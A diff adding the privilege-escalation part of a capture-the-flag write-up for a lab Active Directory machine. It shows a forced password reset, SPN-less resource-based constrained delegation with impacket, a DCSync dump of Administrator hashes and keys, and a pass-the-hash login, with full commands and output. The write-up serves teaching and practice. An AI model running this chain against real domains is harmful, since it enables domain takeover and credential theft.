@@ -360,4 +360,191 @@ Let's grab the user flag and move on.
 ```
 ## Privilege Escalation
 
-TO BE CONTINUED
+Checking for interesting groups or privileges, we don’t find anything.
+
+```powershell
+*Evil-WinRM* PS C:\Users\svc_sspr\Documents> whoami /all
+
+USER INFORMATION
+----------------
+
+User Name        SID
+================ ==============================================
+phantom\svc_sspr S-1-5-21-4029599044-1972224926-2225194048-1103
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                                  Type             SID                                            Attributes
+=========================================== ================ ============================================== ==================================================
+Everyone                                    Well-known group S-1-1-0                                        Mandatory group, Enabled by default, Enabled group
+BUILTIN\Users                               Alias            S-1-5-32-545                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Pre-Windows 2000 Compatible Access  Alias            S-1-5-32-554                                   Mandatory group, Enabled by default, Enabled group
+BUILTIN\Remote Management Users             Alias            S-1-5-32-580                                   Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NETWORK                        Well-known group S-1-5-2                                        Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\Authenticated Users            Well-known group S-1-5-11                                       Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\This Organization              Well-known group S-1-5-15                                       Mandatory group, Enabled by default, Enabled group
+PHANTOM\SSPR Service                        Group            S-1-5-21-4029599044-1972224926-2225194048-1137 Mandatory group, Enabled by default, Enabled group
+NT AUTHORITY\NTLM Authentication            Well-known group S-1-5-64-10                                    Mandatory group, Enabled by default, Enabled group
+Mandatory Label\Medium Plus Mandatory Level Label            S-1-16-8448
+
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                Description                    State
+============================= ============================== =======
+SeMachineAccountPrivilege     Add workstations to domain     Enabled
+SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
+
+
+USER CLAIMS INFORMATION
+-----------------------
+
+User claims unknown.
+```
+
+Let’s run the BloodHound Python ingestor to see if we can find intersting paths.
+
+```bash
+└─$ bloodhound-python -c ALL --zip -u svc_sspr -p gB6XTcqVP5MlP7Rc -d phantom.vl -ns 10.129.145.232                                
+INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
+INFO: Found AD domain: phantom.vl
+INFO: Getting TGT for user
+INFO: Connecting to LDAP server: dc.phantom.vl
+INFO: Found 1 domains
+INFO: Found 1 domains in the forest
+INFO: Found 1 computers
+INFO: Connecting to LDAP server: dc.phantom.vl
+WARNING: Kerberos auth to LDAP failed, trying NTLM
+INFO: Found 30 users
+INFO: Found 61 groups
+INFO: Found 2 gpos
+INFO: Found 5 ous
+INFO: Found 19 containers
+INFO: Found 0 trusts
+INFO: Starting computer enumeration with 10 workers
+INFO: Querying computer: DC.phantom.vl
+WARNING: Failed to get service ticket for DC.phantom.vl, falling back to NTLM auth
+CRITICAL: CCache file is not found. Skipping...
+WARNING: DCE/RPC connection failed: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
+INFO: Done in -1443M 45S
+INFO: Compressing output into 20250824122335_bloodhound.zip
+```
+And run the BloodHound GUI.
+I will mark the svc_sspr user as owned and look for outbound object control.
+
+<img width="3592" height="1550" alt="025-08-23 182438" src="https://github.com/user-attachments/assets/d6429da1-eecd-4f3c-bb79-2f41e893d6b5" />
+
+We can change the password of 3 users. All those 3 members are in a group “ICT Security” which has “AddAllowedToAct” permission over DC.PHANTOM.VL.
+
+>If a user has AddAllowedToAct rights over a Domain Controller (DC), you can perform a Resource-Based Constrained Delegation (RBCD) attack. This lets you impersonate any user (including DA) to the DC.
+
+So this is a promising path. Let’s use bloodyAD to change the password for user WSILVA, who is in the ICT Security group.
+
+```bash
+┌──(kali㉿kali)-[~]
+└─$ bloodyAD --host "10.129.145.232" -d "dc.phantom.vl" -u "svc_sspr" -p "gB6XTcqVP5MlP7Rc" set password "wsilva" "Password123"
+[+] Password changed successfully!
+```
+This opens us up for the RBCD attack.
+
+The first step would be to create a new machine, but trying to do so we get an error that the machine account quota is exceeded.
+```bash
+└─$ impacket-addcomputer phantom.vl/svc_sspr:'gB6XTcqVP5MlP7Rc' \
+    -dc-ip 10.129.145.232 -computer-name 'OWNED01$' -computer-pass 'Password123!'
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+[-] Authenticating account's machine account quota exceeded!
+```
+So there is another way. On The Hacker Recipes there is an article on how to abuse it on SPN-less users:
+https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd#rbcd-on-spn-less-users
+
+The technique is as follows:
+
+1. Obtain a TGT for the SPN-less user allowed to delegate to a target and retrieve the TGT session key.
+2. Change the user’s password hash and set it to the TGT session key.
+3. Combine S4U2self and U2U so that the SPN-less user can obtain a service ticket to itself, on behalf of another (powerful) user, and then proceed to S4U2proxy to obtain a service ticket to the target the user can delegate to, on behalf of the other, more powerful, user.
+4.Pass the ticket and access the target as the delegated other.
+
+First, let’s add wsilva as the account that can act on behalf of others to DC.
+
+```bash
+└─$ impacket-rbcd -delegate-to 'DC$' -delegate-from wsilva -dc-ip '10.129.145.232' -action 'write' 'phantom'/'wsilva':'Password123'                    
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
+[*] Delegation rights modified successfully!
+[*] wsilva can now impersonate users on DC$ via S4U2Proxy
+[*] Accounts allowed to act on behalf of other identity:
+[*]     wsilva       (S-1-5-21-4029599044-1972224926-2225194048-1114)
+```
+Now let’s create a TGT for wsilva.
+
+```bash
+└─$ impacket-getTGT phantom.vl/wsilva:Password123
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Saving ticket in wsilva.ccache
+```
+now i need to grab a ticket session key from the .ccache file i just created.
+
+```bash
+└─$ impacket-describeTicket 'wsilva.ccache' | grep 'Ticket Session Key'
+[*] Ticket Session Key            : 46567c9a23cd0913743b1f2a90d234c8eb4e88f1e963b8da564304e6cb421968
+```
+With changepasswd we change wsilva’s NT hash to the TGT session key.
+
+```bash
+└─$ impacket-changepasswd -newhashes :46567c9a23cd0913743b1f2a90d234c8eb4e88f1e963b8da564304e6cb421968 'phantom.vl'/'wsilva':'Password123'@'10.129.145.232' 
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Changing the password of phantom.vl\wsilva
+[*] Connecting to DCE/RPC as phantom.vl\wsilva
+[*] Password was changed successfully.
+[!] User might need to change their password at next logon because we set hashes (unless password never expires is set).
+```
+Now I can request a ticket for Administrator.
+
+```bash
+└─$ KRB5CCNAME=wsilva.ccache impacket-getST -u2u -impersonate Administrator -spn cifs/DC.phantom.vl phantom.vl/wsilva -k -no-pass
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Impersonating Administrator
+[*] Requesting S4U2self+U2U
+[*] Requesting S4U2Proxy
+[*] Saving ticket in Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache
+```
+Since we have Administrator ccache, we can DCSync to get the Domain Admin NT hash.
+
+```bash
+─$ KRB5CCNAME=Administrator@cifs_DC.phantom.vl@PHANTOM.VL.ccache impacket-secretsdump -k -no-pass phantom.vl/Administrator@DC.phantom.vl -just-dc-user Administrator
+Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:aa2abd9db4f5984e657f834484512117:::
+[*] Kerberos keys grabbed
+Administrator:aes256-cts-hmac-sha1-96:82b06cc6f32916467e0ce67dca982b602b672729672954d7c582d6d15c2351f2
+Administrator:aes128-cts-hmac-sha1-96:df1edf2fba6e16750d8ba64ebbd6b28c
+Administrator:des-cbc-md5:d98ffeadb56babfd
+[*] Cleaning up... 
+```
+And authenticate with the hash to Evil-WinRM.
+
+```bash
+└─$ evil-winrm -i 10.129.145.232 -u Administrator -H aa2abd9db4f5984e657f834484512117
+Evil-WinRM shell v3.7
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
+phantom\administrator
+```
+We have successfully got the Administrator shell. Let’s grab the flag and finish the machine.
+
+```bash
+*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
+ab68b<REDACTED>
+```
